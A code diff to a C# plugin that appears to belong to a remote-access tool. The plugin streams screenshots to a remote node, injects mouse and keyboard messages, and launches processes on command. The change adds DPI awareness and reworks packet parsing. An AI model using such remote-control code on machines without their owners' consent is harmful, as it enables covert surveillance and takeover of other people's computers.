@@ -31,6 +31,11 @@ namespace Plugin
         Imaging_handler ImageHandler;
         input_handler InputHandler;
         Process_Handler ProcessHandler;
+
+        [DllImport("SHCore.dll", SetLastError = true)]
+        public static extern int SetProcessDpiAwareness(int awareness);
+
+
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
@@ -39,6 +44,9 @@ namespace Plugin
                 ImageNode?.Disconnect();
                 node.Disconnect();
             }
+
+            SetProcessDpiAwareness(2);//2 is being aware of the dpi per monitor
+
             Thread thread = new Thread(async()=>await ScreenShotThread());
             thread.Start();
             try
@@ -65,13 +73,13 @@ namespace Plugin
                     }
                     else if (data[0] == 2)
                     {
-                        quality = node.sock.BytesToInt(await node.ReceiveAsync());
+                        quality = node.sock.BytesToInt(data,1);
                     }
                     else if (data[0] == 3)
                     {
-                        uint msg = (uint)node.sock.BytesToInt(await node.ReceiveAsync());
-                        IntPtr wParam = (IntPtr)node.sock.BytesToInt(await node.ReceiveAsync());
-                        IntPtr lParam = (IntPtr)node.sock.BytesToInt(await node.ReceiveAsync());
+                        uint msg = (uint)node.sock.BytesToInt(data,1);
+                        IntPtr wParam = (IntPtr)node.sock.BytesToInt(data, 5);
+                        IntPtr lParam = (IntPtr)node.sock.BytesToInt(data, 9);
                         new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
                     }
                     else if (data[0] == 4)
@@ -80,7 +88,7 @@ namespace Plugin
                     }
                     else if (data[0] == 5)
                     {
-                        ProcessHandler.CreateProc(Encoding.UTF8.GetString(await node.ReceiveAsync()));
+                        ProcessHandler.CreateProc(Encoding.UTF8.GetString(data,1,data.Length-1));
                     }
                     else if (data[0] == 6)
                     {
